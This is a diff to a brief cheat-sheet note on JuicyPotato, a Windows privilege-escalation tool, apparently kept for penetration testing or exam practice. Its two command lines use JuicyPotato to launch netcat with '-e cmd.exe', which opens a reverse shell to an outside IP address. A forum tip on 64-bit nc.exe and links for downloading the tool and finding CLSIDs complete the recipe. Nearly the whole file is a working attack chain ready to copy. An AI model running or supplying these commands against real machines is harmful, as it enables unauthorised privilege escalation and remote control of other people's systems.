@@ -1,9 +1,16 @@
 Netcat command for Juicypotato
 
- ==>    jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\Downloads\nc.exe -e cmd.exe 192.168.119.174 9001" -t *     <==
+1.  ==>    jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\Downloads\nc.exe -e cmd.exe 192.168.119.174 9001" -t *     <==
+
+2. ==> juicypotato.exe -l 654 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\wwwroot\nc64.exe -nv 192.168.1.1 4444 -e c:\windows\system32\cmd.exe" -t * <==
+
+Forum message note => Look closely... its 64bit. you need full paths and you need the 64 bit version of nc.exe. )
 
 Find CLSID  ==> https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter
 
 Download Juicy potato exe file ==> https://github.com/ohpe/juicy-potato/releases
+
+
+
 
 
